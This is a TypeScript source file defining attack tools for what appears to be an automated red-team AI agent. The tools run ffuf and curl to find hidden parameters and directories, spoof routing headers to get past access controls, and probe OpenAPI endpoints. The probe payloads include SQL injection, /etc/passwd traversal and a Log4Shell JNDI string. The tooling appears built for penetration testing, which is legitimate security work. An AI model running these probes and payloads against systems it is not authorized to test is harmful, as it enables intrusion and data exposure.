import { FunctionTool } from '@google/adk'
import { z } from 'zod/v4'
import { kesExec } from '../../shared/kes-client.js'
import { createLogger } from '../../shared/logger.js'
import { buildTargetUrl } from '../lib/port-protocol.js'

const logger = createLogger('red_team_agent')

const DEFAULT_PARAM_WORDLIST = '/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt'
const DEFAULT_DIR_WORDLIST = '/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt'

export const paramFuzzTool = new FunctionTool({
  name: 'param_fuzz',
  description: `Fuzz a URL endpoint to discover hidden GET/POST parameters using ffuf and the seclists burp-parameter-names wordlist.
Useful for finding undocumented parameters that bypass auth, change behaviour, or expose internal functions — the kind of issue signature scanners miss.`,
  parameters: z.object({
    target: z.string().describe('Target host'),
    port: z.number().describe('Target port'),
    nmapTags: z.array(z.string()).optional(),
    path: z.string().describe('Path to fuzz, e.g. "/api/user"'),
    method: z.enum(['GET', 'POST']).describe('HTTP method'),
    matchCodes: z.string().optional().describe('Comma-separated HTTP status codes to match (default: 200,302,500)'),
    filterSize: z.number().optional().describe('Filter out responses of this exact byte size (use to suppress baseline noise)'),
    campaignId: z.string().optional(),
  }),
  execute: async ({ target, port, nmapTags, path, method, matchCodes, filterSize, campaignId }) => {
    const start = Date.now()
    const url = buildTargetUrl(target, port, nmapTags ?? [], path)
    const codes = matchCodes ?? '200,302,401,403,500'
    const fzKw = method === 'POST' ? `-d "FUZZ=test"` : `-u "${url}?FUZZ=test"`
    const baseUrl = method === 'POST' ? `-u "${url}"` : ''
    const filter = filterSize ? `-fs ${filterSize}` : ''

    const cmd = `ffuf -w ${DEFAULT_PARAM_WORDLIST}:FUZZ -X ${method} ${baseUrl} ${fzKw} -mc ${codes} ${filter} -t 30 -s -of json -o /tmp/ffuf_param.json 2>/dev/null; cat /tmp/ffuf_param.json 2>/dev/null`

    const result = await kesExec(cmd, 120)

    let discovered: Array<{ param: string; status: number; length: number }> = []
    try {
      const j = JSON.parse(result.stdout || '{}') as { results?: Array<{ input: { FUZZ: string }; status: number; length: number }> }
      discovered = (j.results ?? []).map(r => ({ param: r.input.FUZZ, status: r.status, length: r.length }))
    } catch {
      // ffuf produced no parseable output
    }

    await logger.audit('param_fuzz', { target, port, path, method }, { count: discovered.length }, Date.now() - start, campaignId)

    return {
      url,
      discovered,
      count: discovered.length,
      hint: discovered.length > 0
        ? 'Try each discovered parameter for SQLi, IDOR, SSRF, command injection. Several distinct response sizes often signal different code paths.'
        : 'No parameters discovered. Try a larger wordlist or a different path.',
    }
  },
})

export const dirFuzzSmartTool = new FunctionTool({
  name: 'dir_fuzz_smart',
  description: `Smart directory/path fuzzing with a context-aware wordlist chosen from the detected web tech stack (PHP/JSP/ASP-specific lists, framework-specific paths).
Use after web_tech_detect.`,
  parameters: z.object({
    target: z.string(),
    port: z.number(),
    nmapTags: z.array(z.string()).optional(),
    techStack: z.array(z.string()).describe('Detected technologies, e.g. ["php","wordpress"]'),
    extensions: z.string().optional().describe('Extensions to test (default derived from tech stack)'),
    campaignId: z.string().optional(),
  }),
  execute: async ({ target, port, nmapTags, techStack, extensions, campaignId }) => {
    const start = Date.now()
    const url = buildTargetUrl(target, port, nmapTags ?? [])
    const lower = techStack.map(t => t.toLowerCase())

    let wordlist = DEFAULT_DIR_WORDLIST
    let exts = extensions
    if (lower.includes('wordpress')) {
      wordlist = '/usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt'
    } else if (lower.includes('drupal')) {
      wordlist = '/usr/share/seclists/Discovery/Web-Content/CMS/Drupal.txt'
    } else if (lower.includes('joomla')) {
      wordlist = '/usr/share/seclists/Discovery/Web-Content/CMS/joomla-themes.fuzz.txt'
    } else if (lower.includes('tomcat') || lower.includes('jboss')) {
      wordlist = '/usr/share/seclists/Discovery/Web-Content/tomcat.txt'
      exts = exts ?? 'jsp,jspx,do,action'
    } else if (lower.includes('iis') || lower.includes('asp.net')) {
      wordlist = '/usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt'
      exts = exts ?? 'aspx,asp,asmx,ashx'
    } else if (lower.includes('php')) {
      exts = exts ?? 'php,phtml,php3,php5,php7,phps'
    }

    const extFlag = exts ? `-e .${exts.split(',').join(',.')}` : ''
    const cmd = `ffuf -w ${wordlist}:FUZZ -u "${url}/FUZZ" ${extFlag} -mc 200,204,301,302,307,401,403 -fc 404 -t 40 -s -of json -o /tmp/ffuf_dir.json 2>/dev/null; cat /tmp/ffuf_dir.json 2>/dev/null`
    const result = await kesExec(cmd, 180)

    let paths: Array<{ path: string; status: number; length: number }> = []
    try {
      const j = JSON.parse(result.stdout || '{}') as { results?: Array<{ input: { FUZZ: string }; status: number; length: number }> }
      paths = (j.results ?? []).map(r => ({ path: '/' + r.input.FUZZ, status: r.status, length: r.length }))
    } catch {
      // empty
    }

    await logger.audit('dir_fuzz_smart', { target, port, techStack, wordlist }, { count: paths.length }, Date.now() - start, campaignId)
    return { url, wordlist, paths, count: paths.length }
  },
})

export const headerFuzzTool = new FunctionTool({
  name: 'header_fuzz',
  description: `Test a target for routing/identity-trust header smuggling: X-Forwarded-Host, X-Original-URL, X-Rewrite-URL, X-Forwarded-For ACL bypass, Host header injection, X-Real-IP spoofing.
A different status code or response body when the header is set indicates the target trusts the header — frequently exploitable.`,
  parameters: z.object({
    target: z.string(),
    port: z.number(),
    nmapTags: z.array(z.string()).optional(),
    path: z.string().describe('Path to test (e.g. "/admin")'),
    spoofValue: z.string().optional().describe('Value to use for spoof attempts (default 127.0.0.1)'),
    campaignId: z.string().optional(),
  }),
  execute: async ({ target, port, nmapTags, path, spoofValue, campaignId }) => {
    const start = Date.now()
    const url = buildTargetUrl(target, port, nmapTags ?? [], path)
    const spoof = spoofValue ?? '127.0.0.1'

    const baseline = await kesExec(`curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 8 -k "${url}"`, 12)
    const baselineCode = baseline.stdout.split('|')[0]
    const baselineSize = baseline.stdout.split('|')[1]

    const headers = [
      ['X-Forwarded-For', spoof],
      ['X-Real-IP', spoof],
      ['X-Originating-IP', spoof],
      ['X-Forwarded-Host', spoof],
      ['X-Original-URL', path],
      ['X-Rewrite-URL', path],
      ['X-Custom-IP-Authorization', spoof],
      ['X-Host', spoof],
      ['Forwarded', `for=${spoof}`],
    ]

    const findings: Array<{ header: string; value: string; status: string; size: string; differs: boolean }> = []
    for (const [name, value] of headers) {
      const r = await kesExec(
        `curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 8 -k -H "${name}: ${value}" "${url}"`,
        12,
      )
      const [code, size] = r.stdout.split('|')
      const differs = code !== baselineCode || size !== baselineSize
      findings.push({ header: name, value, status: code, size, differs })
    }

    const interesting = findings.filter(f => f.differs)

    await logger.audit('header_fuzz', { target, port, path }, { interesting: interesting.length }, Date.now() - start, campaignId)
    return {
      url,
      baseline: { status: baselineCode, size: baselineSize },
      findings,
      interesting,
      hint: interesting.length > 0
        ? 'A header that changes response is a strong signal of header trust. Probe for full ACL bypass or SSRF via that header.'
        : 'No header-based behaviour change observed.',
    }
  },
})

export const apiSchemaFuzzTool = new FunctionTool({
  name: 'api_schema_fuzz',
  description: `Discover an OpenAPI/Swagger schema (common paths: /openapi.json, /swagger.json, /api-docs, /v2/api-docs, /v3/api-docs) and fuzz documented parameters with type-aware mutations (oversize strings, negative numbers, type confusion, nested objects).
Excellent for unknown attack surface against API gateways.`,
  parameters: z.object({
    target: z.string(),
    port: z.number(),
    nmapTags: z.array(z.string()).optional(),
    schemaPath: z.string().optional().describe('Override: explicit path to the OpenAPI document'),
    campaignId: z.string().optional(),
  }),
  execute: async ({ target, port, nmapTags, schemaPath, campaignId }) => {
    const start = Date.now()
    const baseUrl = buildTargetUrl(target, port, nmapTags ?? [])
    const candidates = schemaPath
      ? [schemaPath]
      : ['/openapi.json', '/swagger.json', '/swagger/v1/swagger.json', '/api-docs', '/v2/api-docs', '/v3/api-docs', '/.well-known/openapi.json']

    let schemaText = ''
    let foundAt = ''
    for (const p of candidates) {
      const r = await kesExec(`curl -s --max-time 8 -k "${baseUrl}${p}"`, 10)
      if (r.stdout.includes('"openapi"') || r.stdout.includes('"swagger"') || r.stdout.includes('"paths"')) {
        schemaText = r.stdout
        foundAt = p
        break
      }
    }

    if (!schemaText) {
      await logger.audit('api_schema_fuzz', { target, port }, { found: false }, Date.now() - start, campaignId)
      return { found: false, hint: 'No OpenAPI/Swagger schema found at common paths.' }
    }

    let endpoints: Array<{ method: string; path: string; params: string[] }> = []
    try {
      const schema = JSON.parse(schemaText) as { paths?: Record<string, Record<string, { parameters?: Array<{ name: string }> }>> }
      for (const [p, methods] of Object.entries(schema.paths ?? {})) {
        for (const [m, def] of Object.entries(methods)) {
          if (!['get', 'post', 'put', 'delete', 'patch'].includes(m.toLowerCase())) continue
          endpoints.push({
            method: m.toUpperCase(),
            path: p,
            params: (def.parameters ?? []).map(x => x.name),
          })
        }
      }
    } catch {
      return { found: true, schemaPath: foundAt, error: 'Schema not parseable as JSON' }
    }

    const probes = endpoints.slice(0, 25)
    const mutations = ['A'.repeat(5000), '-1', 'null', "0' OR '1'='1", '../../../../etc/passwd', '${jndi:ldap://x}']
    const interesting: Array<{ method: string; path: string; param: string; mutation: string; status: string; size: string }> = []

    for (const ep of probes) {
      for (const param of ep.params) {
        for (const mut of mutations) {
          const url = ep.method === 'GET'
            ? `${baseUrl}${ep.path}?${param}=${encodeURIComponent(mut)}`
            : `${baseUrl}${ep.path}`
          const body = ep.method === 'GET' ? '' : `-d '{"${param}":"${mut.replace(/"/g, '\\"')}"}' -H "Content-Type: application/json"`
          const r = await kesExec(
            `curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 6 -k -X ${ep.method} ${body} "${url}"`,
            8,
          )
          const [code, size] = r.stdout.split('|')
          if (code === '500' || code === '502' || code === '503' || /5\d\d/.test(code)) {
            interesting.push({ method: ep.method, path: ep.path, param, mutation: mut.slice(0, 40), status: code, size })
          }
        }
      }
    }

    await logger.audit('api_schema_fuzz', { target, port, schemaPath: foundAt }, { endpoints: endpoints.length, interesting: interesting.length }, Date.now() - start, campaignId)
    return {
      found: true,
      schemaPath: foundAt,
      endpointsTotal: endpoints.length,
      endpointsProbed: probes.length,
      interesting,
      hint: interesting.length > 0
        ? '5xx responses often reveal stack traces, type-confusion, deserialization bugs, or injection points.'
        : 'No 5xx triggered. Try authenticated probes or dive into the schema manually.',
    }
  },
})
